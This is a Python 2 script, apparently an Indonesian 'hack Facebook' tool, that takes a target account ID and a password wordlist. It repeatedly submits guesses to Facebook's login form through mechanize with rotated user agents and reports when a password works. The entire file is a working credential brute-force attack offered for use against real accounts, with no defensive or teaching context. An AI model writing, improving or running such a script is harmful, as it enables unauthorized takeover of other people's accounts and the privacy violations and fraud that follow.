#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random 

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    print RR+"  +============================================+"
    print GG+"  |••••••••   HACK FACEBOOK MAS ^_^   •••••••••|" 
    print RR+"  +============================================+"
    print WW+"  |            MOD BY: IQBALZ NOOBS            |"
    print GG+"  |      Berdoa Dulu Sebelum Menggunakan       |"
    print WW+"  |            FACEBOOK: Iqbalznoobs           |"
    print Y+"  |              INSTAGRAM: IQBALZ5            |"
    print WW+"  |--------------------------------------------|"
    print GL+"  |        LIFE OF PROGRAMMER [ L.O.P ]        |"
    print WW+"  |--------------------------------------------|"
    print RR+"  +============================================+"
    print GG+"  |••••••••   HACK FACEBOOK MAS ^_^   •••••••••|"
    print RR+"  +============================================+"     


cover()

email = str(raw_input(GL+" Masukkan ID Target\033[33;1m: "))

passwordlist = str(raw_input(WW+" Masukkan File Wordlist\033[95;1m [ pass.txt ] \033[92m : "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print("Password does not exist in the wordlist")



def brute(password):
        sys.stdout.write(GG+"\r[+]\033[97;1m Mencoba ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[+]\033[97;1m Password Find \033[31;1m===| \033[96;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"ANY KEY to Exit....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                password = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+"""
 ___      _           _
|_ _|__ _| |__   __ _| |____   
 | |/ _` | '_ \ / _` | |_  /    
,| | (_| | |_) | (_| | |/ /_
|___\__, |_.__/ \__,_|_/___/  \033[96;4mLife Of Programmer\033[92;1m
       |_|
      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GL+" [*] Account to crack : {}".format(email)
        print RR+" [*] Loaded :" , len(total),WW+ "passwords"
        print Y+" [*] Cracking, please wait ...\n\n"

if __name__ == '__main__':
        main()
